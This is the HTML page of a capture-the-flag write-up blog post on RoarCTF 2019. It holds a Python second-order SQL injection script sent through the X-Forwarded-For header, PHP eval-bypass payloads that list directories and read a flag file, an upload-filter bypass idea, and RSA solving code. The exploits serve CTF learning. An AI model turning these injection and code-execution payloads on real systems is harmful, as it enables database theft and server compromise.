@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>RoarCTF 2019复现 | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="web
+online_proxy
+特征: 第一次登录后源代码内容有如下:
+
+换一个X-Forwarded-For 后会发现currentip是根据xff判别的
+
+那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
+$result = query(&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#34;.addslashes($uuid).&#34;&#39;&#34;);
+if(count($result) &gt; 0) {
+    if($ip !== $result[0][&#39;current_ip&#39;]) {
+        $last_ip = $result[0][&#39;current_ip&#39;];
+        query(&#34;delete from ip_log where uuid=&#39;&#34;.addslashes($uuid).&#34;&#39;&#34;);
+    } else {
+        $last_ip = $result[0][&#39;last_ip&#39;];
+    }
+}
+query(&#34;insert into ip_log values (&#39;&#34;.addslashes($uuid).&#34;&#39;, &#39;&#34;.addslashes($ip).&#34;&#39;, &#39;$last_ip&#39;);&#34;);
+die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($last_ip !== &#34;&#34; ? &#34;\nLast Ip: &#34;.$last_ip : &#34;&#34;).&#34; --&gt;&#34;);
+解法:
+先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜&hellip;&hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="https://dragonbox.top/posts/ctf-roarctfwp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="https://dragonbox.top/flash.ico">
+<link rel="mask-icon" href="https://dragonbox.top/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://dragonbox.top/posts/ctf-roarctfwp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://dragonbox.top/posts/ctf-roarctfwp/">
+  <meta property="og:site_name" content="ch4ser の 超元域">
+  <meta property="og:title" content="RoarCTF 2019复现">
+  <meta property="og:description" content="web online_proxy 特征: 第一次登录后源代码内容有如下:
+换一个X-Forwarded-For 后会发现currentip是根据xff判别的
+那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
+$result = query(&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#34;.addslashes($uuid).&#34;&#39;&#34;); if(count($result) &gt; 0) { if($ip !== $result[0][&#39;current_ip&#39;]) { $last_ip = $result[0][&#39;current_ip&#39;]; query(&#34;delete from ip_log where uuid=&#39;&#34;.addslashes($uuid).&#34;&#39;&#34;); } else { $last_ip = $result[0][&#39;last_ip&#39;]; } } query(&#34;insert into ip_log values (&#39;&#34;.addslashes($uuid).&#34;&#39;, &#39;&#34;.addslashes($ip).&#34;&#39;, &#39;$last_ip&#39;);&#34;); die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($last_ip !== &#34;&#34; ? &#34;\nLast Ip: &#34;.$last_ip : &#34;&#34;).&#34; --&gt;&#34;); 解法:
+先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜……在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2019-10-22T08:32:09+00:00">
+    <meta property="article:modified_time" content="2019-10-22T08:32:09+00:00">
+    <meta property="og:image" content="https://dragonbox.top/image-20211114142019085.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://dragonbox.top/image-20211114142019085.png">
+<meta name="twitter:title" content="RoarCTF 2019复现">
+<meta name="twitter:description" content="web
+online_proxy
+特征: 第一次登录后源代码内容有如下:
+
+换一个X-Forwarded-For 后会发现currentip是根据xff判别的
+
+那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
+$result = query(&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#34;.addslashes($uuid).&#34;&#39;&#34;);
+if(count($result) &gt; 0) {
+    if($ip !== $result[0][&#39;current_ip&#39;]) {
+        $last_ip = $result[0][&#39;current_ip&#39;];
+        query(&#34;delete from ip_log where uuid=&#39;&#34;.addslashes($uuid).&#34;&#39;&#34;);
+    } else {
+        $last_ip = $result[0][&#39;last_ip&#39;];
+    }
+}
+query(&#34;insert into ip_log values (&#39;&#34;.addslashes($uuid).&#34;&#39;, &#39;&#34;.addslashes($ip).&#34;&#39;, &#39;$last_ip&#39;);&#34;);
+die(&#34;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &#34;.($last_ip !== &#34;&#34; ? &#34;\nLast Ip: &#34;.$last_ip : &#34;&#34;).&#34; --&gt;&#34;);
+解法:
+先用1&#39;|1|&#39;1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜&hellip;&hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://dragonbox.top/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "RoarCTF 2019复现",
+      "item": "https://dragonbox.top/posts/ctf-roarctfwp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RoarCTF 2019复现",
+  "name": "RoarCTF 2019复现",
+  "description": "web online_proxy 特征: 第一次登录后源代码内容有如下:\n换一个X-Forwarded-For 后会发现currentip是根据xff判别的\n那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了\n$result = query(\u0026#34;select current_ip, last_ip from ip_log where uuid = \u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;\u0026#34;); if(count($result) \u0026gt; 0) { if($ip !== $result[0][\u0026#39;current_ip\u0026#39;]) { $last_ip = $result[0][\u0026#39;current_ip\u0026#39;]; query(\u0026#34;delete from ip_log where uuid=\u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;\u0026#34;); } else { $last_ip = $result[0][\u0026#39;last_ip\u0026#39;]; } } query(\u0026#34;insert into ip_log values (\u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;, \u0026#39;\u0026#34;.addslashes($ip).\u0026#34;\u0026#39;, \u0026#39;$last_ip\u0026#39;);\u0026#34;); die(\u0026#34;\\n\u0026lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip \u0026#34;.($last_ip !== \u0026#34;\u0026#34; ? \u0026#34;\\nLast Ip: \u0026#34;.$last_ip : \u0026#34;\u0026#34;).\u0026#34; --\u0026gt;\u0026#34;); 解法:\n先用1'|1|'1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜\u0026hellip;\u0026hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "web online_proxy 特征: 第一次登录后源代码内容有如下:\n换一个X-Forwarded-For 后会发现currentip是根据xff判别的\n那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了\n$result = query(\"select current_ip, last_ip from ip_log where uuid = '\".addslashes($uuid).\"'\"); if(count($result) \u003e 0) { if($ip !== $result[0]['current_ip']) { $last_ip = $result[0]['current_ip']; query(\"delete from ip_log where uuid='\".addslashes($uuid).\"'\"); } else { $last_ip = $result[0]['last_ip']; } } query(\"insert into ip_log values ('\".addslashes($uuid).\"', '\".addslashes($ip).\"', '$last_ip');\"); die(\"\\n\"); 解法:\n先用1'|1|'1作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成二次注入, 事实上也确实如此, 但这个可能得猜……在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到\n成功执行了.\n搬运赵师傅的脚本学习学习\n#!/usr/bin/env python3 import requests target = \"http://localhost:8302/\" def execute_sql(sql): print(\"[*]请求语句：\" + sql) return_result = \"\" payload = \"0'|length((\" + sql + \"))|'0\" session = requests.session() r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --\u003e\", start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\"[+]长度：\" + str(length)) for i in range(1, length + 1, 5): payload = \"0'|conv(hex(substr((\" + sql + \"),\" + str(i) + \",5)),16,10)|'0\" r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --\u003e\", start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8') print(\"[+]位置 \" + str(i) + \" 请求五位成功:\" + bytes.fromhex(hex(result)[2:]).decode('utf-8')) return return_result # 获取数据库 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\")) # 获取数据库表 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'\")) # 获取数据库表 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' \")) # 获取表中内容 print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\")) 5555555\n在addslashes后插入数据在数据库中是这样的\n第二行是提取出来不经过addslashes重新插入的结果\neasy_calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\nhexdec(bin2hex('/')); ?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号 hexdec(bin2hex('/f1agg')); ?+num=file_get_contents(hex2bin(dechex(52115961636711))) 源码是这么执行语句的\n$str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); Simple UPload \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-\u003emaxSize = 4096 ;// 设置附件上传大小 $upload-\u003eallowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload-\u003erootPath = './Public/Uploads/';// 设置附件上传目录 $upload-\u003esavePath = '';// 设置附件上传子目录 $info = $upload-\u003eupload() ; if(!$info) {// 上传错误提示错误信息 $this-\u003eerror($upload-\u003egetError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-\u003erootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=\u003e$url,\"success\"=\u003e1)); } } } 思路: 由于只对’file’文件做判断, 所以一旦上传多个文件就可以绕过,然后根据文件名的生成方式来爆破php文件位置.\ncrypto RSA 题目给出了条件\nn=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 (((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L p=gmpy2.next_prime(x*y*z) q=gmpy2.next_prime(z) c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L 因为\n2**(2019) \u003e 26833491826787145242474...1422L 所以\n((y%x)**5)%(x%y) = 1 或者 0 所以将这项忽略,再将(y+1)/x忽略\ny 约等于26833491826787145242474...1422L的316次方 y 约等于83 然后(y+1)/x 必须为整数 ,结合上述条件可以轻易求得x=2.y=83\n接下来\np = xyz + a q = z + b xyzz + xyzb + az + ab = n 忽略ab, az, xyzb, 求出z的近似值,然后这个值肯定比真实的z要大, 因此可以根据这个值循环减一带入运算来爆破p ,求出的p如果可以整除n就停下.\nimport gmpy2 from Crypto.Util import number n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L # x=2 # y = 83 # z_close = gmpy2.iroot(n//166, 2) z_close = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023 while True: p_close = gmpy2.next_prime(166*z_close) if n % p_close == 0: p = p_close q = n // p break z_close -= 1 # p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 # q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) print number.long_to_bytes(pow(c,d,n)) babyrsa import sympy import random def myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A) p=myGetPrime() #A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 #B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 q=myGetPrime() #A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 #B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 r=myGetPrime() n=p*q*r #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 c=pow(flag,e,n) #e=0x1001 #c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 #so,what is the flag? 直接求b的阶乘是不可能的,递归达到最大限制次数也求不出来.\n这里要用到威尔逊定理\n判定一个数字是素数的充分必要条件:\n(p-1)! = -1 (mod p)\n在这套题中可以发现(-1)(A-1)(A-2)...(B+2)(B+1)是B! 关于A的逆元,然后就好求了\nimport gmpy2 import sympy from Crypto.Util import number def myprime(a, b): ans = 1 for i in range(b+1, a): ans = (ans *i) % a ans = -1 * ans num = gmpy2.invert(ans ,a) return sympy.nextprime(num) A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 p = myprime(A1, B1) A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 q = myprime(A2, B2) n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 enc=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 r = n /(p*q) e=0x1001 phi = (p-1)*(q-1)*(r-1) d = gmpy2.invert(e, phi) m = pow(enc, d, n) print number.long_to_bytes(m) ",
+  "wordCount" : "611",
+  "inLanguage": "en",
+  "image":"https://dragonbox.top/image-20211114142019085.png","datePublished": "2019-10-22T08:32:09Z",
+  "dateModified": "2019-10-22T08:32:09Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch4ser"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://dragonbox.top/posts/ctf-roarctfwp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch4ser の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://dragonbox.top/flash.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="https://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://dragonbox.top/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://dragonbox.top/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="https://dragonbox.top/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      RoarCTF 2019复现
+    </h1>
+    <div class="post-meta"><span title='2019-10-22 08:32:09 +0000 UTC'>October 22, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;611 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager"
+                srcset='https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_1f982888fedde896.png 360w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_8f1e2668d3881b10.png 480w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png 693w'
+                src="https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png"
+                sizes="(min-width: 768px) 720px, 100vw"
+                width="693" height="347"
+                alt="">
+        
+</figure><div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#online_proxy">online_proxy</a></li>
+    <li><a href="#easy_calc">easy_calc</a></li>
+    <li><a href="#simple-upload">Simple UPload</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#rsa">RSA</a></li>
+    <li><a href="#babyrsa">babyrsa</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="web">web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="online_proxy">online_proxy<a hidden class="anchor" aria-hidden="true" href="#online_proxy">#</a></h2>
+<p>特征: 第一次登录后源代码内容有如下:</p>
+<p><img alt="image-20211114142027467" loading="lazy" src="/posts/ctf-roarctfwp/image-20211114142027467.png"></p>
+<p>换一个<strong>X-Forwarded-For</strong> 后会发现currentip是根据xff判别的</p>
+<p><img alt="image-20211114142033017" loading="lazy" src="/posts/ctf-roarctfwp/image-20211114142033017.png"></p>
+<p>那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">addslashes</span>($uuid)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">count</span>($result) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($ip <span style="color:#f92672">!==</span> $result[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;current_ip&#39;</span>]) {
+</span></span><span style="display:flex;"><span>        $last_ip <span style="color:#f92672">=</span> $result[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;current_ip&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;delete from ip_log where uuid=&#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">addslashes</span>($uuid)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $last_ip <span style="color:#f92672">=</span> $result[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;last_ip&#39;</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;insert into ip_log values (&#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">addslashes</span>($uuid)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;, &#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">addslashes</span>($ip)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;, &#39;</span><span style="color:#e6db74">$last_ip</span><span style="color:#e6db74">&#39;);&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- Debug Info: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Duration: </span><span style="color:#e6db74">$time</span><span style="color:#e6db74"> s </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Current Ip: </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74"> &#34;</span><span style="color:#f92672">.</span>($last_ip <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Last Ip: &#34;</span><span style="color:#f92672">.</span>$last_ip <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; --&gt;&#34;</span>);
+</span></span></code></pre></div><p>解法:</p>
+<p>先用<code>1'|1|'1</code>作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成<strong>二次注入</strong>, 事实上也确实如此, 但这个可能得猜&hellip;&hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到</p>
